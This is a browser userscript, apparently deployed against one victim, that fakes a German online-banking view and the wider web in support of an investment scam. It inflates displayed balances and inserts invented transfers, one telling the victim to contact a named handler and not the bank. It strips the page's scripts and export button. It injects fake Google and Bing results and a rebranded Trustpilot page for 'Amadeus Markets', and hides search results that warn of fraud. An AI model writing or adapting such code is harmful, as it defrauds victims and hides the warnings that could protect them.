// ==UserScript==
// @name         Ed AM Wilfried Bachem
// @namespace    http://tampermonkey.net/
// @version      0.5
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.rb-lauf.de/*
// @match        https://www.drivehq.com/*
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/492231/Ed%20AM%20Wilfried%20Bachem.user.js
// @updateURL https://update.greasyfork.org/scripts/492231/Ed%20AM%20Wilfried%20Bachem.meta.js
// ==/UserScript==

   //=========================================================================================================================================================
 //=========================================================================================================================================================
 //=========================================================================================================================================================
// STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------

    // Array of configurable balance adjustments  STARTING WITH 1
    var BALANCE_CONFIGS = [
        { index: 1, adjustmentAmount:  0},
        { index: 4, adjustmentAmount: 0},
        { index: 5, adjustmentAmount: 0},
    //    { index: 5, adjustmentAmount: 55000 },
   //     { index: 7, adjustmentAmount: 99990}
        // Add more balance configurations as needed
    ];


// UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------

   // Specify the IBAN text to check for presence
    const ibanTextToCheck = "5435 DE76 3101 0833 9911 5982 66";

    // Specify the value to increase or decrease the balance (use negative value to decrease)
    const balanceModification = 0.0; // Change this value to increase or decrease the balance

//---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS------

// THE ORDER IS FROM THE TOP, THUS 1 IS THE FIRST ONE FROM THE TOP AND SO FORTH

 const transactions = [
        {
            month: "Treuhand",
            day: "",
            title: "ÜBERWEISUNG VON JP Morgan Chase, bitte an Andreas Graf sich wenden, nicht die Bank damit nicht gesppert wird.",
            type: "Überweisung",
            amount: "377.991,00€",
            insertBelowOriginal: false, // Set to true to insert below original, false to insert above
            transactionOrder: 1 // Specify the order of the transaction
        },
        {
            month: "Apr",
            day: "16",
            title: "ÜBERWEISUNG VON Amadeus Ltd, nicht ausgeben, auf Gespräch mit Amadeus Berater warten.",
           type: "Überweisung",
           amount: "19.500,00€",
            insertBelowOriginal: false, // Set to true to insert below original, false to insert above
           transactionOrder: 2 // Specify the order of the transaction
        },
        // Add more transactions here in similar format
    ];



//===================================================================================================================================================================================================================

// STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------
//----------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE------

//===================================================================================================================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {

    'use strict';

    // Array of configurable balance adjustments  STARTING WITH 1
//    var BALANCE_CONFIGS = [
 //       { index: 1, adjustmentAmount:  3700},
//        { index: 2, adjustmentAmount: 3700},
//        { index: 3, adjustmentAmount: 3700},
 //       { index: 5, adjustmentAmount: 55000 },
//        { index: 7, adjustmentAmount: 99990}
        // Add more balance configurations as needed
//    ];


     // Function to check if the specified class is present
    function isClassPresent(className) {
        return document.querySelector("." + className) !== null;
    }

    // Function to modify euro balances based on index
    function modifyEuroBalance() {
        // Check if the specified class is present
        if (!isClassPresent("linkAleph__arrowNav___PZheb")) {
            console.log("Class not present, balances will not be modified.");
            return;
        }

        // Combine sibling text nodes of specified classes
        var basketElements = document.querySelectorAll('.BasketView__elInner___BY1BR.BasketView__sum___uG8Hr, .BasketListItem__elInner___Sl9Hk');
        basketElements.forEach(function(element) {
            var siblingText = "";
            var sibling = element.nextSibling;
            while (sibling) {
                if (sibling.nodeType === Node.TEXT_NODE) {
                    siblingText += sibling.textContent.trim();
                }
                sibling = sibling.nextSibling;
            }
            // Combine text content with euro sign
            element.textContent += ' ' + siblingText;
        });

        var euroElements = document.evaluate('//*[contains(text(),"€")]', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
        for (var i = 0; i < BALANCE_CONFIGS.length; i++) {
            var config = BALANCE_CONFIGS[i];
            var index = config.index;
            var adjustmentAmount = config.adjustmentAmount;

            // Ensure index is within bounds
            if (index >= 0 && index < euroElements.snapshotLength) {
                var element = euroElements.snapshotItem(index);
                var text = element.textContent.trim();
                // Extracting numeric value from the text
                var numericRegex = /([\d.]+),(\d{2}) €/;
                var match = numericRegex.exec(text);
                if (match) {
                    var numericValue = parseFloat(match[1].replace(/\./g, '').replace(',', '.')); // parse with dot as decimal separator
                    // Modifying the balance by the specified value
                    var modifiedValue = numericValue + adjustmentAmount;
                    // Formatting the modified value back to currency format
                    var formattedModifiedValue = formatCurrency(modifiedValue);
                    // Updating the text content with the modified value and euro sign
                    element.textContent = formattedModifiedValue + " €";
                    console.log(element);
                }
            }
        }
        // Remove the element with class "linkAleph__arrowNav___PZheb" after a short delay
        setTimeout(function() {
            var linkAlephElement = document.querySelector('.linkAleph__arrowNav___PZheb');
            if (linkAlephElement) {
                linkAlephElement.remove();
                console.log("Element with class 'linkAleph__arrowNav___PZheb' removed.");
            }
        }, 10);
    }

    // Function to format currency
    function formatCurrency(amount) {
        return new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }).format(amount).replace(/\s€/, ''); // remove whitespace and euro sign
    }

    // Check every 3 seconds whether conditions are met for balance modification
    setInterval(function() {
        modifyEuroBalance();
    }, 200); // 3000 milliseconds = 3 seconds

 }
//===================================================================================================================================================================================================================

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------
//----------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE---------------------STARTPAGE------

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++


//===================================================================================================================================================================================================================




//===================================================================================================================================================================================================================

// UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------
//------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE-----------------------------------

//===================================================================================================================================================================================================================

 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {
   // Specify the IBAN text to check for presence
//    const ibanTextToCheck = "DE17 5003 3300 2968 5942 00";

    // Specify the value to increase or decrease the balance (use negative value to decrease)
//    const balanceModification = -1000; // Change this value to increase or decrease the balance

    // Function to check if IBAN text is present on the page
    function isIbanTextPresent() {
        return document.body.textContent.includes(ibanTextToCheck);
    }

    // Function to check if the specified element is present on the page
    function isElementPresent(selector) {
        return document.querySelector(selector) !== null;
    }

    // Function to modify the balance
    function modifyBalance() {
        // Check if IBAN text is present and the specified element is present
        if (isIbanTextPresent() && isElementPresent('.movementsHeader__dateFilterContainer___ojnUy')) {
            // Select the balance element
            const balanceElement = document.querySelector('.OverallSaldoMH__amount___iUZZX');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                const currentBalanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots to get a valid number format
                const currentBalanceString = currentBalanceText.replace(/[^\d,]/g, '').replace(',', '.');

                // Parse the current balance as a float
                const currentBalance = parseFloat(currentBalanceString);

                // Check if the current balance is a valid number
                if (!isNaN(currentBalance)) {
                    // Calculate the new balance
                    const newBalance = currentBalance + balanceModification;

                    // Format the new balance with commas and dots
                    const newBalanceText = newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2 });

                    // Update the balance element with the new balance
                    balanceElement.textContent = newBalanceText + ' €';

                    // Remove the specified element after a short delay
                    setTimeout(function() {
                        const movementsHeaderElement = document.querySelector('.movementsHeader__dateFilterContainer___ojnUy');
                        if (movementsHeaderElement) {
                            movementsHeaderElement.remove();
                            console.log("Element with class '.movementsHeader__dateFilterContainer___ojnUy' removed.");
                        }
                    }, 10);
                } else {
                    console.error('Failed to parse the current balance:', currentBalanceText);
                }
            } else {
                console.error('Balance element not found.');
            }
        } else {
            console.error('IBAN text or specified element not found. Balance modification skipped.');
        }
    }

    // Function to periodically check if all conditions are met for balance modification
    function checkConditionsAndModifyBalance() {
        if (isIbanTextPresent() && isElementPresent('.movementsHeader__dateFilterContainer___ojnUy')) {
            modifyBalance();
        } else {
            console.log('IBAN text or specified element not found. Balance modification skipped.');
        }
    }

    // Check conditions and modify the balance every 2 seconds
    setInterval(checkConditionsAndModifyBalance, 200);




}
//===================================================================================================================================================================================================================

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------
//------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE---------------------UMSATZE BALANCE-----------------------------------

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

//===================================================================================================================================================================================================================










//===================================================================================================================================================================================================================

// UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS--------------------------
//---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS------

//===================================================================================================================================================================================================================


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {

 // Configurable variables
//    const ibanTextToCheck = "DE17 5003 3300 2968 5942 00"; // Text to check in the page
//    const transactions = [
///        {
//            month: "Apr",
//            day: "13",
//            title: "ÜBERWEISUNG VON JP Morgan Chase",
//            type: "Überweisung",
//            amount: "5,00€",
//            insertBelowOriginal: false, // Set to true to insert below original, false to insert above
//            transactionOrder: 1 // Specify the order of the transaction
//        },
//        {
//            month: "Apr",
//            day: "14",
//            title: "ÜBERWEISUNG VON JP Morgan Chase",
//            type: "Überweisung",
//            amount: "-1.500,00€",
//            insertBelowOriginal: false, // Set to true to insert below original, false to insert above
//            transactionOrder: 2 // Specify the order of the transaction
//        },
        // Add more transactions here in similar format
//    ];

    console.log("Script execution started.");

  // Function to remove scripts from the document
    function removeScripts() {
        console.log("Removing scripts...");
        document.querySelectorAll('script').forEach(function(script) {
            script.remove();
            console.log("Script removed.");
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var dobserver = new MutationObserver(function(mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log("Script added. Removing...");
                        node.remove();
                        console.log("Script removed.");
                    }
                }
            }
        }
    });

    // Start observing the document
    dobserver.observe(document.documentElement, { childList: true, subtree: true });

    // Remove all scripts from the document
    removeScripts();

    // Function to create a new <li> element with specified content
    function createNewListItem(transaction) {
        console.log("Creating new list item for transaction:", transaction);
        const listItem = document.createElement('li');
        listItem.className = "AccountsDateContainer__dateWrapper___DtXoS";
        listItem.innerHTML = `
            <p class="AccountsDateContainer__date___xF4m6">${transaction.month}<span class="AccountsDateContainer__dateDay___OD2Fd">${transaction.day}</span></p>
            <div class="AccountsDateContainer__listItemWrapper___CE_nG">
                <div class="accountsListItem__itemWrapper___HeXqB">
                    <div class="accountsListItem__infoDefault___GO58p">
                        <p class="accountsListItem__item1___X6YnG accountsListItem__id___DXJse">${transaction.title}</p>
                        <p class="accountsListItem__item2___JEpRv accountsListItem__amount___x9rfi ${transaction.amount.startsWith('-') ? '' : 'accountsListItem__amount--positive___k7_Qz'}"><span class="accountsListItem__badge___L1X4s">${transaction.amount}</span></p>
                        <p class="accountsListItem__item3___muMY_ accountsListItem__code___eTq5M">${transaction.type}</p>
                    </div>
                </div>
            </div>`;
        return listItem;
    }

    // Function to duplicate the first child <li> element and insert it either above or below the original
    function duplicateAndInsert() {
        console.log("Checking if IBAN text is present on the page.");
        if (!document.body.textContent.includes(ibanTextToCheck)) {
            console.log("IBAN text not found. Aborting transaction insertion.");
            return;
        }

        console.log("IBAN text found. Duplicating and inserting transactions.");
        const parent = document.querySelector('.AccountsList__listContainer___G7ux4'); // Select the parent element
        if (parent) {
            const firstChild = parent.querySelector('ul > li:first-child'); // Select the first child <li> element
            if (firstChild) {
                console.log("First child element found:", firstChild);
                // Sort transactions based on transactionOrder
                transactions.sort((a, b) => a.transactionOrder - b.transactionOrder);
                console.log("Sorted transactions:", transactions);
                transactions.forEach(transaction => {
                    const clone = createNewListItem(transaction); // Create a new <li> element with specified content
                    if (transaction.insertBelowOriginal) {
                        console.log("Inserting transaction below original:", transaction);
                        parent.querySelector('ul').insertBefore(clone, firstChild.nextSibling); // Insert below original
                    } else {
                        console.log("Inserting transaction above original:", transaction);
                        parent.querySelector('ul').insertBefore(clone, firstChild); // Insert above original
                    }
                });
                console.log("All transactions inserted.");
            } else {
                console.log("No first child element found. Rechecking in 5 milliseconds.");
                setTimeout(duplicateAndInsert, 200); // Recheck after 5 milliseconds
            }
        } else {
            console.log("Parent element not found. Rechecking in 5 milliseconds.");
            setTimeout(duplicateAndInsert, 200); // Recheck after 5 milliseconds
        }
    }

    // Call the function to duplicate and insert either above or below the original <li> element
    duplicateAndInsert();

    console.log("Starting continuous check for transactions.");

    // Function to check for transactions every 200 milliseconds
    setInterval(function() {
        const transactionsFound = document.querySelectorAll('.AccountsDateContainer__dateWrapper___DtXoS').length > 0;
        if (!transactionsFound) {
            console.log("Transactions not found. Checking conditions for reinsertion.");
            duplicateAndInsert(); // Check conditions and reinsert transactions if necessary
        } else {
            console.log("Transactions found on the page. Continuing check.");
        }
    }, 1900);

    console.log("Continuous check started.");






}

//===================================================================================================================================================================================================================

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS--------------------------
//---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS---------------------UMSATZE TRANSACTIONS------

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++


//===================================================================================================================================================================================================================





// UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS--
//---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------


 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {

// Function to remove scripts from the document
function removeScripts() {
    console.log("Removing scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Script removed.");
    });
}

// Function to remove elements by class name
function removeElementsByClassName(className) {
    console.log("Removing elements with class: " + className);
    document.querySelectorAll('.' + className).forEach(function(element) {
        element.remove();
        console.log("Element removed.");
    });
}

// Watch for changes in the DOM and remove added scripts and specified elements
var observer = new MutationObserver(function(mutationsList) {
    for (var mutation of mutationsList) {
        if (mutation.addedNodes) {
            for (var node of mutation.addedNodes) {
                if (node.tagName === 'SCRIPT') {
                    console.log("Script added. Removing...");
                    node.remove();
                    console.log("Script removed.");
                }
            }
        }
    }
    // Remove elements with specified classes after each mutation
    removeElementsByClassName("movementsHeader__exportContainer___BCJ4p");

});

// Start observing the document
observer.observe(document.documentElement, { childList: true, subtree: true });

// Remove all scripts and specified elements from the document
removeScripts();
removeElementsByClassName("movementsHeader__exportContainer___BCJ4p");




     }

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++

// UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS---------------------UTILITY FUCNCTIONS--

//THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++++++++++++++++THE END++++


//================================================================================================================================================================

//????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

//================================================================================================================================================================

//????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

//================================================================================================================================================================

  // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["amadeus", "market", "amdeus", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust"],
                        results: [
                            {
                                url: "https://www.amadeus-markets.com",
                                title: "Amadeus Markets dein Broker",
                                description: "Amadeus Markets ist der Broker mit der besten Reputation.",
                                footerText: "https://www.amadeus-markets.com",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Amadeus Markets - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Amadeus Markets",
                                footerText: "https://de.trustpilot.com/review/amadeusmarkets.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Amadeus Markets Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Amadeus Markets ab dem 1. Januar unser Sponsor und Partner wird. Amadeus Markets ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Amadeus Markets sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}

// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Amadeus Markets";
    const customLogoURL = "https://amadeus-markets.com/images/Logowhite.png";
    const customURL = "https://amadeus-markets.com";
    const customReferenceURL = "amadeus-markets.com";
    const customLinkURL = "https://amadeus-markets.com"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Amadeus Markets",
      "icmarkets": "Amadeus Markets",
      "ic-markets": "Amadeus Markets",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}

// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1) {
  var newURL = "https://amadeus-markets.com/";
var newLogoURL = "https://i.ibb.co/cQ26kXf/Untitled-design.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

observer.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://www.example1.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }


// Check if "timeline" can be found after the hash sign in the URL
